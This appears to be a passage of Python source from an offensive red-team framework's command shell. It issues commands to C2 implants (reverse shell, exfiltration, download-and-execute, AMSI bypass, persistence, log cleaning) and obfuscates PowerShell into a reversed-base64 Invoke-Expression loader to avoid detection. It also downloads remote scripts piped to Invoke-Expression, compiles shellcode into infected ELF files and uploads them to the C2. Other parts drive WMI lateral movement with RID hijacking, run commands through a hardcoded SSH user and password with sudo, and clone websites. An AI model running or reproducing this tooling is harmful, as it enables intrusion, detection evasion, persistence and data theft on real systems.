        client_id (str): ID del cliente (opcional).

        Returns:
        None
        """
        if client_id:
            clientid = client_id
        else:
            clientid = input(f"    [!] Enter the client id (default {self.c2_clientid}): ") or self.c2_clientid

        data = {"client_id": clientid, "command": command}

        try:
            print(f"URL: {self.c2_url}")
            print(f"Auth: {self.c2_auth}")
            print(f"Data: {data}")

            # Envía la solicitud HTTPS (ignora errores de certificado con verify=False)
            response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
            response.raise_for_status()  # Lanza una excepción si el código de estado no es 200
            print_msg(f"Command '{command}' issued successfully.")
        except ConnectionError as e:
            print_error(f"Error de conexión: {e}")
        except RequestException as e:
            print_error(f"Error en la solicitud: {e}")
        except Exception as e:
            print_error(f"Error inesperado: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_issue_command_to_c2(self, line):
        """
        Exec command in the client using the C2.

        Parameters:
        command (str): client_id [optional], Command to exec.

        Returns:
        None
        """
        if line:
            parts = line.split(maxsplit=1)
            nparts = len(parts)
            if nparts == "1":
                self.issue_command_to_c2(line)
            else:
                user = parts[0]
                command = parts[1]
                self.issue_command_to_c2(command, user)
        else:
            line = input ("    [!] Enter the command: ") or 'whoami'
            self.issue_command_to_c2(line)

    def complete_issue_command_to_c2(self, text, line, begidx, endidx):
        """Autocomplete: 1st arg = implant name, 2nd arg = beacon command (with : if needed)"""
        parts = line.split()

        commands = [
            "stealth_off",
            "stealth_on",
            "download:",
            "upload:",
            "rev:",
            "exfil:",
            "download_exec:",
            "obfuscate:",
            "cleanlogs:",
            "discover:",
            "adversary:",
            "softenum:",
            "netconfig:",
            "escalatelin:",
            "proxy:",
            "stop_proxy:",
            "portscan:",
            "compressdir:",
            "sandbox:",
            "isvm:",
            "debug:",
            "persist:",
            "simulate:",
            "migrate:",
            "shellcode:",
            "amsi:",
            "terminate:"
        ]

        config_dir = self.sessions_dir
        pattern = os.path.join(config_dir, "implant_config_*.json")
        implant_names = []

        for file_path in glob.glob(pattern):
            try:
                with open(file_path, 'r') as f:
                    data = json.load(f)
                    name = data.get("name")
                    if name:
                        implant_names.append(name)
            except (json.JSONDecodeError, IOError):
                continue

        implant_names.sort()

        parts = line[:begidx].split()  
        current_word = text  

        if len(parts) == 1:
            suggestions = [name for name in implant_names if name.startswith(current_word)]
            return suggestions
        elif len(parts) == 2:
            first_arg = parts[1]
            if first_arg in implant_names:
                return [cmd for cmd in commands if cmd.startswith(current_word)]
            else:
                return [name for name in implant_names if name.startswith(current_word)]
        else:
            return [cmd for cmd in commands if cmd.startswith(current_word)]


    @cmd2.with_category(post_exploitation_category)
    def do_ofuscatorps1(self, line):
        """
        Obfuscates a PowerShell script using various techniques.
        by @JoelGMSec https://github.com/JoelGMSec/Invoke-Stealth/ rewite in python by grisun0
        This function:
            - Displays a banner and help information if requested.
            - Validates the provided parameters.
            - Executes all obfuscation techniques on the input PowerShell script by default.
            - Displays the result in the terminal.

        Behavior:
            - Requires `python3` to be installed for certain techniques.
            - Uses parameters from the command line for the script path and optional flags.

        Usage:
            ofuscatorps1 <script_path> [-nobanner]

        Techniques:
            - Chameleon: Substitute strings and concatenate variables.
            - BetterXencrypt: Compresses and encrypts with random iterations.
            - PyFuscation: Obfuscate functions, variables, and parameters.
            - ReverseB64: Encode with base64 and reverse it to avoid detections.
            - PSObfuscation: Convert content to bytes and compress with Gzip.
            - All: Sequentially executes all techniques described above.
        """

        if not line:
            script_path = get_users_dic("ps1")
        else:
            script_path = line.strip()

        def load_chameleon():

            print_msg("Loading Chameleon and doing some obfuscation.. ")
            self.cmd(f'python3 ./Resources/Chameleon/chameleon.py -a  {script_path} -o')
            print_msg("[OK]")
            if os.path.exists('function_mapping.json'):
                os.remove('function_mapping.json')

        def load_betterxencrypt():


            print_msg("Loading BetterXencrypt and doing some encryption with random iterations.. ")
            if os.path.exists('./Resources/BetterXencrypt/BetterXencrypt.ps1'):
                self.cmd(f'pwsh -Command "Import-Module ./Resources/BetterXencrypt/BetterXencrypt.ps1 -Force; Invoke-BetterXencrypt -InFile {script_path} -OutFile {script_path} -Iterations {random.randint(10, 25)}"')
            else:
                self.cmd(f'pwsh -Command "(New-Object System.Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/JoelGMSec/Invoke-Stealth/main/Resources/BetterXencrypt/BetterXencrypt.ps1\'); Import-Module .\\BetterXencrypt.ps1 -Force; Invoke-BetterXencrypt -InFile {script_path} -OutFile {script_path} -Iterations {random.randint(10, 25)}"')
            print_msg("[OK]")
            if os.path.exists('BetterXencrypt.ps1'):
                os.remove('BetterXencrypt.ps1')

        def load_pyfuscation():

            print_msg("Loading PyFuscation and doing some obfuscation.. ")
            self.cmd(f'python3 ./Resources/PyFuscation/PyFuscation.py -fvp --ps  {script_path}')
            pyfuscation_output = f"{os.getcwd()}/Resources/PyFuscation/tmp/script.ps1"
            if os.path.exists(pyfuscation_output):
                with open(script_path, 'w') as f:
                    f.write(open(pyfuscation_output).read())
            print_msg("[OK]")
            if os.path.exists('./Resources/PyFuscation/tmp'):
                self.cmd(f'rm -rf ./Resources/PyFuscation/tmp')


            print_msg("Encoding with base64 and reverse it to avoid detections.. ")
            with open(script_path, 'rb') as f:
                base64_encoded = base64.b64encode(f.read()).decode()
            reversed_base64 = base64_encoded[::-1]
            with open(script_path, 'w') as f:
                f.write(f'$best64code = "{reversed_base64}";\n')
                f.write('$base64 = $best64code.ToCharArray(); [array]::Reverse($base64); -join $base64 | out-file $InvokePath\n')
                f.write('$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"));\n')
                f.write('$pwn = iNvoKe-eXPreSsiOn; New-Alias -name pwn -Value $pwn -Force; pwn $LoadCode;\n')
            print_msg("[OK]")


            print_msg("Loading PSObfuscation and randomizing script.. ")
            if os.path.exists('./Resources/PSObfuscation/Invoke-PSObfuscation.ps1'):
                self.cmd(f'pwsh -Command "Import-Module ./Resources/PSObfuscation/Invoke-PSObfuscation.ps1 -Force; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
            else:
                self.cmd(f'pwsh -Command "(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/JoelGMSec/Invoke-Stealth/master/Resources/PSObfuscation/Invoke-PSObfuscation.ps1\') | Invoke-Expression; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
            print_msg("[OK]")

        def reverse_b64_encoder():
            print_msg("Encoding with base64 and reverse it to avoid detections.. ")
            with open(script_path, 'rb') as f:
                base64_encoded = base64.b64encode(f.read()).decode()
            reversed_base64 = base64_encoded[::-1]
            with open(script_path, 'w') as f:
                f.write(f'$best64code = "{reversed_base64}";\n')
                f.write('$base64 = $best64code.ToCharArray(); [array]::Reverse($base64); -join $base64 | out-file $InvokePath\n')
                f.write('$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"));\n')
                f.write('$pwn = iNvoKe-eXPreSsiOn; New-Alias -name pwn -Value $pwn -Force; pwn $LoadCode;\n')
            print_msg("[OK]")

        def load_psobfuscation():
            print_msg("Loading PSObfuscation and randomizing script.. ")
            if os.path.exists('./Resources/PSObfuscation/Invoke-PSObfuscation.ps1'):
                self.cmd(f'pwsh -Command "Import-Module ./Resources/PSObfuscation/Invoke-PSObfuscation.ps1 -Force; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
            else:
                self.cmd(f'pwsh -Command "(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/JoelGMSec/Invoke-Stealth/master/Resources/PSObfuscation/Invoke-PSObfuscation.ps1\') | Invoke-Expression; Invoke-PSObfuscation -Path {script_path} -Comments -Variables -OutFile {script_path}"')
            print_msg("[OK]")

        load_chameleon()
        load_betterxencrypt()
        load_pyfuscation()
        reverse_b64_encoder()
        load_psobfuscation()
        print_msg("Done!")

    @cmd2.with_category(post_exploitation_category)
    def do_d3monizedshell(self, line):
        """
        Executes the D3m0n1z3dShell tool for persistence in Linux.

        This function:
            - Installs D3m0n1z3dShell if not already installed.
            - Executes the D3m0n1z3dShell command with the provided parameters.
            - Displays the result in the terminal.

        Behavior:
            - Requires `git` and `curl` to be installed.
            - Uses a one-liner installation method for simplicity.

        Usage:
            d3monizedshell
        """
        path = os.getcwd()
        d3monizedshell_repo = "https://github.com/MatheuZSecurity/D3m0n1z3dShell.git"
        d3monizedshell_path = os.path.join(path, "external", ".exploit", "D3m0n1z3dShell")

        try:
            if not os.path.exists(d3monizedshell_path):
                print_msg("D3m0n1z3dShell is not installed. Installing...")
                self.cmd(f"git clone {d3monizedshell_repo} {d3monizedshell_path}")
                self.cmd(f"cd {d3monizedshell_path} && chmod +x demonizedshell.sh")

            command = f"cd {d3monizedshell_path} && sudo ./demonizedshell.sh"
            self.cmd(command)

        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_scp(self, line):
        """
        Copies the local "sessions" directory to a remote host using scp, leveraging sshpass for automated authentication.

        Steps:
            1. Verifies if the credentials file exists in the "sessions" directory.
            If not, prompts the user for a username and password.
            2. Reads the credentials file if it exists and extracts the username and password.
            3. Constructs an scp command to deploy the "sessions" directory to the remote host.
            4. Executes the scp command using the system shell.

        Args:
            line (str): Input command line (optional). The third parameter can be 'win' or 'lin' to specify the target OS.

        Dependencies:
            - The `sshpass` command-line tool must be installed on the local machine.
            - `scp` must be installed on both the local and remote machines.
            - The remote host must be accessible via SSH.

        Attributes:
            - `self.params`: Dictionary containing the following keys:
                - `username` (str, optional): Predefined username. Defaults to prompting the user if not provided.
                - `password` (str, optional): Predefined password. Defaults to prompting the user if not provided.
                - `rhost` (str): Remote host's IP or domain name.

        Raises:
            - KeyError: If `rhost` is not provided in `self.params`.
            - FileNotFoundError: If the "sessions" directory does not exist.

        Note:
            - The `credentials.txt` file, if present, should have credentials in the format `username:password`
            on the first line.

        Returns:
            None
        """
        path = os.getcwd()
        if line:
            parts = line.strip().split()
            tmp_path = parts[0] if parts else f"{path}/sessions"
            target_os = parts[1] if len(parts) > 1 else None
        else:
            tmp_path = f"{path}/sessions"
            target_os = None

        credentials_path = os.path.join(os.getcwd(), "sessions", "credentials.txt")
        if not os.path.exists(credentials_path):
            username = self.params.get("username") or input("    [!] Enter the username: ")
            password = self.params.get("password") or input("    [!] Enter the password: ")
        else:
            with open(credentials_path, "r") as f:
                credentials = get_credentials()
                if not credentials:
                    return

                for user, passwd in credentials:

                    username = user
                    password = passwd


        rhost = self.params["rhost"]
        print_msg("Deploying sessions directory.")

        if target_os not in ["win", "lin"]:
            target_os = input("    [!] Enter 1 for Windows or 2 for Linux (default is Linux): ").strip() or '2'
            if target_os == "1":
                target_os = "win"
            else:
                target_os = "lin"

        if target_os == "win":
            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ "
        else:
            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/home/.grisun0"

        print_msg(scp_command)
        self.cmd(scp_command)

        return

    @cmd2.with_category(post_exploitation_category)
    def do_apt_proxy(self, line):
        """
        Configures the local machine with internet access to act as an APT proxy for a machine without internet access.

        Steps:
            1. Installs and configures apt-cacher-ng on the local machine.
            2. Generates the necessary commands to configure the remote machine to use the proxy.
            3. Copies the commands to the clipboard using the copy2clip function.

        Parameters:
            line (str): The IP address of the remote machine without internet access.

        Returns:
            None
        """
        try:
            if not is_binary_present("apt-cacher-ng"):
                print_warn("Installing and configuring apt-cacher-ng...")
                subprocess.run(["sudo", "apt-get", "update"], check=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "apt-cacher-ng"], check=True)

            subprocess.run(["sudo", "systemctl", "start", "apt-cacher-ng"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "apt-cacher-ng"], check=True)

            remote_ip = self.params["rhost"]
            if not remote_ip:
                print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
                return

            proxy_config = f"Acquire::http::Proxy \"http://{self.params['lhost']}:3142\";"
            proxy_config_file = "/etc/apt/apt.conf.d/01proxy"

            commands = [
                f"echo '{proxy_config}' | sudo tee {proxy_config_file}",
                "sudo apt-get update"
            ]

            commands_str = "\n".join(commands)
            copy2clip(commands_str)

            if line.startswith("remote"):
                ssh_command = f"""bash -c '{commands_str}' &"""
                self.issue_command_to_c2(ssh_command)

            print_msg("APT proxy configured successfully.")
            print_msg("Commands to configure the remote machine have been copied to the clipboard.")
        except Exception as e:
            print_error(f"An error occurred: {e}")

        except subprocess.CalledProcessError as e:
            print_error(f"Command failed: {e.cmd}")
            print_error(f"Output: {e.output}")
            print_error(f"Return code: {e.returncode}")
        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_pip_proxy(self, line):
        """
        Configures the local machine with internet access to act as a pip proxy for a machine without internet access.

        Steps:
            1. Installs and configures squid on the local machine.
            2. Generates the necessary commands to configure the remote machine to use the proxy.
            3. Copies the commands to the clipboard using the copy2clip function.

        Parameters:
            line (str): The IP address of the remote machine without internet access.

        Returns:
            None
        """
        try:
            if not is_binary_present("squid"):
                print_warn("Installing and configuring squid...")
                subprocess.run(["sudo", "apt-get", "update"], check=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)

            subprocess.run(["sudo", "systemctl", "start", "squid"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "squid"], check=True)

            if line:
                remote_ip = line.strip()
            else:
                remote_ip = self.params["rhost"]

            if not remote_ip:
                print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
                return

            proxy_config = f"[global]\nindex-url = http://{self.params['lhost']}:3128/simple"
            proxy_config_file = "/etc/pip.conf"

            commands = [
                f"echo \'{proxy_config}\' | sudo tee {proxy_config_file}",
                f"pip install --upgrade pip --trusted-host {self.params['lhost']}"
            ]

            commands_str = "\n".join(commands)
            copy2clip(commands_str)
            if line.startswith("remote"):
                self.issue_command_to_c2(commands_str)
            print_msg("pip proxy configured successfully.")
            print_msg("Commands to configure the remote machine have been copied to the clipboard.")

        except subprocess.CalledProcessError as e:
            print_error(f"Command failed: {e.cmd}")
            print_error(f"Output: {e.output}")
            print_error(f"Return code: {e.returncode}")
        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(post_exploitation_category)
    def do_internet_proxy(self, line):
        """
        Configures the local machine with internet access to act as a proxy for a machine without internet access.

        Steps:
            1. Installs and configures squid on the local machine.
            2. Generates the necessary commands to configure the remote machine to use the proxy.
            3. Copies the commands to the clipboard using the copy2clip function.

        Parameters:
            line (str): The IP address of the remote machine without internet access.

        Returns:
            None
        """
        try:
            print_warn("Installing and configuring squid...")
            if not is_binary_present("squid"):
                subprocess.run(["sudo", "apt-get", "update"], check=True)
                subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "squid"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "squid"], check=True)

            if line:
                remote_ip = line.strip()
            else:
                remote_ip = self.params["rhost"]

            if not remote_ip:
                print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
                return

            squid_config = f"""
            acl localnet src {remote_ip}
            http_access allow localnet
            """
            squid_config_file = "/etc/squid/squid.conf"

            #with open(squid_config_file, "a") as f:
            #    f.write(squid_config)

            subprocess.run(["sudo", "systemctl", "restart", "squid"], check=True)

            proxy_ip = self.params["lhost"]
            proxy_port = 3128

            commands = [
                f"export http_proxy=http://{proxy_ip}:{proxy_port}",
                f"export https_proxy=http://{proxy_ip}:{proxy_port}",
                f"sudo echo 'nameserver {proxy_ip}' >> /etc/resolv.conf"
            ]

            commands_str = "\n".join(commands)
            copy2clip(commands_str)

            print_msg("Internet proxy configured successfully.")
            print_msg("Commands to configure the remote machine have been copied to the clipboard.")

        except subprocess.CalledProcessError as e:
            print_error(f"Command failed: {e.cmd}")
            print_error(f"Output: {e.output}")
            print_error(f"Return code: {e.returncode}")
        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(miscellaneous_category)
    def do_check_update(self, line):
        """
        Checks for updates by comparing the local version with the remote version.

        This function:
            - Fetches the remote version from a JSON file hosted on GitHub.
            - Reads the local version from a JSON file in the script's root directory.
            - Compares the version numbers and determines if an update is needed.

        Behavior:
            - Requires `requests` library to fetch the remote version.
            - Uses JSON parsing to extract version numbers.

        Usage:
            check_update
        """
        try:
            response = requests.get("https://raw.githubusercontent.com/grisuno/LazyOwn/refs/heads/main/version.json")
            remote_version_data = response.json()
            remote_version = remote_version_data.get("version", "release/0.0.0").split('/')[-1]
            if remote_version == "release/0.0.0":
                print_error("Connect to internet to check updates.")
                return

            local_version_path = os.path.join(os.getcwd(), "version.json")
            with open(local_version_path, 'r') as local_version_file:
                local_version_data = json.load(local_version_file)
                local_version = local_version_data.get("version", "release/0.0.0").split('/')[-1]

            if local_version == "release/0.0.0":
                print_error("Integrity fail, please reinstall.")
                return
            if remote_version > local_version:
                print_warn("An update is available. Please update to the latest version.")
                print_msg("Updating")
                self.onecmd("update")
            elif remote_version == local_version:
                print_msg("You are already using the latest version.")
            else:
                print_error("Warning: Your local version is newer than the remote version. This should not happen.")

        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category(lateral_movement_category)
    def do_wmiexecpro(self, line):
        """
        Executes wmiexec-pro with various options for WMI operations.

        This function handles the installation of wmiexec-pro and its dependencies,
        and allows the user to execute various WMI operations with minimal input.
        It reads credentials from a specified file and constructs the necessary
        commands to interact with the target system.

        :param line: Command line input from the user. This input is used to
                    determine the module and action to be executed.
        :returns: None

        The function performs the following steps:
        1. Checks if wmiexec-pro and its dependencies are installed. If not, it
        installs them in specified directories.
        2. Reads credentials from a file.
        3. Constructs and executes the wmiexec-pro command based on user input.
        4. Enumerates available modules and actions for each module, allowing the
        user to select them interactively.
        5. Enumerates available options for each action, allowing the user to select
        them interactively.

        Example usage:
        ```
        do_wmiexecpro("enum -run")
        ```

        This will execute the enumeration module with the `-run` action.

        If no specific command is provided, the function will prompt the user to
        select a module and action interactively.
        """
        path = os.getcwd()
        impacket_repo = "https://github.com/fortra/impacket.git"
        wmiexecpro_repo = "https://github.com/XiaoliChan/wmiexec-Pro.git"
        impacket_path = os.path.join(path, "external", ".exploit", "impacket")
        wmiexecpro_path = os.path.join(path, "external", ".exploit", "impacket", "wmiexec-Pro")

        def install_wmiexecpro():
            try:
                if not os.path.exists(impacket_path):
                    print_msg("Impacket is not installed. Installing...")
                    self.cmd(f"git clone {impacket_repo} {impacket_path}")
                    self.cmd(f"cd {impacket_path} && sudo pip3 install .")

                if not os.path.exists(wmiexecpro_path):
                    print_msg("wmiexec-pro is not installed. Installing...")
                    self.cmd(f"git clone {wmiexecpro_repo} {wmiexecpro_path}")

                print_msg("Installation completed.")
            except Exception as e:
                print_error(f"An error occurred during installation: {e}")

        if not is_binary_present("wmiexec-pro.py"):
            install_wmiexecpro()

        rhost = self.params["rhost"]
        domain = self.params["domain"]

        path_cred = get_credentials(True)

        if not os.path.exists(path_cred):
            print_error("Credentials file not found. Please ensure the credentials file exists.")
            return

        with open(path_cred, "r") as file:
            for file_line in file:
                params = file_line.split(":")
                username = params[0]
                password = params[1].replace("\n", "")

                if line:
                    command_parts = line.split()
                    module = command_parts[0]
                    action = command_parts[1] if len(command_parts) > 1 else ""
                    options = command_parts[2:]

                    command = f"python3 {wmiexecpro_path}/wmiexec-pro.py {domain}\\{username}:{password}@{rhost} {module}"

                    if action:
                        command += f" {action}"

                    if options:
                        command += " " + " ".join(options)

                    self.cmd(command)
                    return

                print_warn("Select the module you want to use:")
                modules = [
                    "enum", "amsi", "exec-command", "filetransfer", "rdp", "winrm",
                    "firewall", "service", "eventlog", "rid-hijack"
                ]
                for i, module in enumerate(modules, start=1):
                    print_msg(f"{i}. {module}")

                try:
                    module_choice = int(input("    [!] Enter the number corresponding to the module: ")) - 1
                    if module_choice < 0 or module_choice >= len(modules):
                        print_error("Invalid choice. Please select a valid number.")
                        return

                    module = modules[module_choice]
                    actions = {
                        "enum": ["-run"],
                        "amsi": ["-enable", "-disable"],
                        "exec-command": ["-shell", "-command", "-silent", "-old", "-save", "-clear"],
                        "filetransfer": ["-upload", "-download", "-clear"],
                        "rdp": ["-enable", "-enable-old", "-enable-ram", "-disable", "-disable-old", "-disable-ram"],
                        "winrm": ["-enable", "-disable"],
                        "firewall": ["-search-port", "-dump", "-rule-id", "-firewall-profile"],
                        "service": ["-action", "-dump"],
                        "eventlog": ["-risk-i-know", "-retrive"],
                        "rid-hijack": ["-user", "-action", "-hijack-rid", "-blank-pass-login", "-remove", "-restore"]
                    }

                    print_warn(f"Select the action for {module}:")
                    for j, action in enumerate(actions[module], start=1):
                        print_msg(f"{j}. {action}")

                    action_choice = int(input("    [!] Enter the number corresponding to the action: ")) - 1
                    if action_choice < 0 or action_choice >= len(actions[module]):
                        print_error("Invalid choice. Please select a valid number.")
                        return

                    action = actions[module][action_choice]

                    options_dict = {
                        "enum": {
                            "-run": []
                        },
                        "amsi": {
                            "-enable": [],
                            "-disable": []
                        },
                        "exec-command": {
                            "-shell": [],
                            "-command": ["-command", "-silent", "-old", "-save"],
                            "-silent": [],
                            "-old": [],
                            "-save": [],
                            "-clear": []
                        },
                        "filetransfer": {
                            "-upload": ["-src-file", "-dest-file"],
                            "-download": ["-src-file", "-dest-file"],
                            "-clear": []
                        },
                        "rdp": {
                            "-enable": [],
                            "-enable-old": [],
                            "-enable-ram": [],
                            "-disable": [],
                            "-disable-old": [],
                            "-disable-ram": []
                        },
                        "winrm": {
                            "-enable": [],
                            "-disable": []
                        },
                        "firewall": {
                            "-search-port": ["-port"],
                            "-dump": [],
                            "-rule-id": ["-action"],
                            "-firewall-profile": ["-action"]
                        },
                        "service": {
                            "-action": ["-service-name", "-display-name", "-bin-path", "-class"],
                            "-dump": []
                        },
                        "eventlog": {
                            "-risk-i-know": [],
                            "-retrive": ["-object-ID"]
                        },
                        "rid-hijack": {
                            "-user": ["-action", "-hijack-rid"],
                            "-action": ["-user"],
                            "-hijack-rid": ["-user"],
                            "-blank-pass-login": ["-enable", "-disable"],
                            "-remove": ["-user"],
                            "-restore": ["-backup-file"]
                        }
                    }

                    options = []
                    if options_dict[module][action]:
                        print_warn(f"Select the options for {action}:")
                        for k, option in enumerate(options_dict[module][action], start=1):
                            print_msg(f"{k}. {option}")

                        while True:
                            try:
                                option_choice = int(input("    [!] Enter the number corresponding to the option (or 0 to finish): ")) - 1
                                if option_choice == -1:
                                    break
                                if option_choice < 0 or option_choice >= len(options_dict[module][action]):
                                    print_error("Invalid choice. Please select a valid number.")
                                    continue
                                option_value = input(f"    [!] Enter the value for {options_dict[module][action][option_choice]}: ").strip()
                                options.append(f"{options_dict[module][action][option_choice]} {option_value}")
                            except ValueError:
                                print_error("Invalid input. Please enter a valid number.")

                    command = f"python3 {wmiexecpro_path}/wmiexec-pro.py {domain}\\{username}:{password}@{rhost} {module} {action}"
                    if options:
                        command += " " + " ".join(options)

                    print_msg(f"Running wmiexec-pro with command: {command}")
                    self.cmd(command)

                except ValueError:
                    print_error("Invalid input. Please enter a valid number.")
                return
    @cmd2.with_category(reporting_category)
    def do_create_session_json(self, line):
        """
        Generates or updates a JSON file to be used as a database.

        The JSON file will be named `sessionLazyOwn_{timestamp}.json` and will be stored
        in the `sessions` directory. The JSON file will contain data from `self.params`
        and additional data extracted from `credentials*.txt` and `hash*.txt` files.

        The structure of the JSON file will be as follows:
        - `params`: Data from `self.params`.
        - `credentials`: A list of dictionaries containing usernames and passwords extracted
        from `credentials*.txt` files.
        - `hashes`: A list of dictionaries containing the contents of `hash*.txt` files.
        - `notes`: The content of the `notes.txt` file, if it exists.

        Returns:
            None
        """
        path = os.getcwd()
        sessions = f"{path}/sessions"
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        session_file = os.path.join(sessions, f'sessionLazyOwn.json')
        session_data = {
            "params": self.params,
            "credentials": [],
            "hashes": [],
            "timestamp": timestamp,
            "notes": None,
            "plan": None,
            "id_rsa": [],
            "implants": []
        }
        credentials_files = glob.glob(os.path.join(sessions, 'credentials*.txt'))
        for i, file in enumerate(credentials_files, start=1):
            with open(file, 'r') as f:
                line = f.readline().strip()
                if line:
                    username, password = line.split(':')
                    session_data["credentials"].append({
                        "usuario": i,
                        "username": username,
                        "contraseña": password
                    })
        hash_files = glob.glob(os.path.join(sessions, 'hash*.txt'))
        for i, file in enumerate(hash_files, start=1):
            with open(file, 'r') as f:
                content = f.read().strip()
                session_data["hashes"].append({
                    "hash": i,
                    "content": content
                })
        notes_file = os.path.join(sessions, 'notes.txt')
        if os.path.exists(notes_file):
            with open(notes_file, 'r') as f:
                session_data["notes"] = f.read().strip()
        plan_file = os.path.join(sessions, 'plan.txt')
        if os.path.exists(plan_file):
            with open(plan_file, 'r') as f:
                session_data["plan"] = f.read().strip()
        id_rsa_files = glob.glob(os.path.join(sessions, 'id_rsa*'))
        for file in id_rsa_files:
            with open(file, 'r') as f:
                session_data["id_rsa"].append(f.read().strip())
        implant_files = glob.glob(os.path.join(sessions, 'implant_config*.json'))

        for i, file in enumerate(implant_files, start=1):
            with open(file, 'r') as f:
                content = f.read().strip()
                session_data["implants"].append({
                    "implant": i,
                    "content": content
                })
        redop_file = os.path.join(sessions, 'status_redop.txt')
        if os.path.exists(redop_file):
            with open(redop_file, 'r') as f:
                session_data["redop"] = f.read().strip()
        try:
            with open(session_file, 'w') as f:
                json.dump(session_data, f, indent=4)
        except Exception as e:

            with open(session_file, 'w') as f:
                json.dump(session_data, f, indent=4)

        self.onecmd("load_session")

    @cmd2.with_category(post_exploitation_category)
    def do_shellcode2elf(self, line):
        """
        Convert shellcode into an ELF file and infect it.

        This function takes an optional input line that specifies the name of the shellcode file.
        If no input line is provided, a filename is generated based on the domain. The function reads
        the shellcode and inserts it into a C source file, then compiles the source file into an ELF
        file. It also creates an infected version of the ELF file and uploads all generated files to a
        command and control (C2) server.

        Args:
            line (str): An optional input line that specifies the name of the shellcode file.

        Returns:
            None
        """
        domain = self.params["domain"]
        if line:
            name = line.strip()
            nameinfect = "infect_" + line.strip()
        else:
            name = f"shellcode_{domain}.c"
            nameinfect = f"infect_shellcode_{domain}.c"

        path = os.getcwd()
        shellcode = get_users_dic("c")
        name_shell = "shell.c"
        name_shell_inf = "infect.c"
        sessions = f"{path}/sessions/c"
        infect_pid = f"{sessions}/{name_shell_inf}"
        pid = "pid.c"
        pid_pid = f"{sessions}/{pid}"
        shellsrc = f"{sessions}/{name}"
        shell = f"{sessions}/{name_shell}"
        name_clean = name.replace(".c","")
        elf = f"{sessions}/{name_clean}"
        final_infect = f"{sessions}/{nameinfect}"
        with open(shellcode, 'r') as f:
            content_shellcode = f.read().strip()

        with open(shell, 'r') as f:
            content_c = f.read().strip()

            content_c = content_c.replace("{shellcode}", content_shellcode)


        with open(infect_pid, 'r') as f:
            infect = f.read().strip()
            infect = infect.replace("{shellcode}", content_shellcode)

        with open(shellsrc, 'w') as f:
            f.write(content_c)
        with open(final_infect, 'w') as f:
            f.write(infect)

        command = f"gcc -o {elf} {shellsrc} -fno-stack-protector -z execstack"
        command_infect = f"gcc -o {elf}_infect {final_infect} -fno-stack-protector -z execstack"

        self.cmd(command)
        self.cmd(command_infect)

        self.cmd(f"gcc -o pid {pid_pid}")

        self.upload_file_to_c2(shellsrc)
        self.upload_file_to_c2(final_infect)
        self.upload_file_to_c2(elf)
        self.upload_file_to_c2(f"{elf}_infect")
        sessions_slash = f"{sessions}/"
        elf_replace = elf.replace(sessions_slash,"")
        shellsrc_clean = shellsrc.replace(sessions_slash,"")
        infect_clean = final_infect.replace(sessions_slash,"")
        command = f"gcc -o {elf_replace} {shellsrc_clean} -fno-stack-protector -z execstack"
        command_infect = f"gcc -o {elf_replace}_infect {infect_clean} -fno-stack-protector -z execstack"

        self.issue_command_to_c2(command)
        self.issue_command_to_c2(command_infect)

        self.download_file_from_c2("/root/root.txt")

        copy2clip(command)
        return

    @cmd2.with_category(post_exploitation_category)
    def do_ssh_cmd(self, line):
        """
        Perform Remote Execution Command trow ssh using grisun0 user, see help grisun0

        Parameters:
            line (str): The command line input, is the command to execute, if not presented is whoami

        Returns:
            None
        """
        if not line:
            line = "whoami"
        rhost = self.params["rhost"]
        username = "grisun0"
        password = "grisgrisgris"
        print_msg(f"Executing ... {line}")
        ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} 'echo "{password}" | sudo -S {line}'"""
        self.cmd(ssh)
        return

    @cmd2.with_category(miscellaneous_category)
    def do_clone_site(self, line):
        """Clone a website and serve the files in sessions/{url_cloned}.
        Args:
            line (str): input line that url to clone

        Returns:
            None
        """
        if not line:
            url = self.params["url"]
        else:
            url = line.strip()
        useragent = "some user agent"
        url_cloned = url.replace("https://", "").replace("http://", "").replace("/", "_").replace(".", "_")
        session_path = f"sessions/{url_cloned}"

        if os.path.isdir(session_path):
            for filename in glob.glob(os.path.join(session_path, "*")):
                if os.path.isdir(filename):
                    shutil.rmtree(filename)
                else:
                    os.remove(filename)
        else:
            os.makedirs(session_path)

        print_msg("Cloning website: " + url)
        try:
            web_request = requests.get(url, headers={'User-Agent': useragent}, verify=False)
            if web_request.status_code != 200 or len(web_request.content) < 1:
                print_error("Unable to clone the site. Status Code: %s" % web_request.status_code)
                sys.exit()

            with open(os.path.join(session_path, "index.html"), 'wb') as fh:
                fh.write(web_request.content)

        except requests.ConnectionError:
            print_error("Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
            with open(os.path.join(session_path, "index.html"), "w") as fh:
                fh.write("<head></head><html><body>It Works!</body></html>")

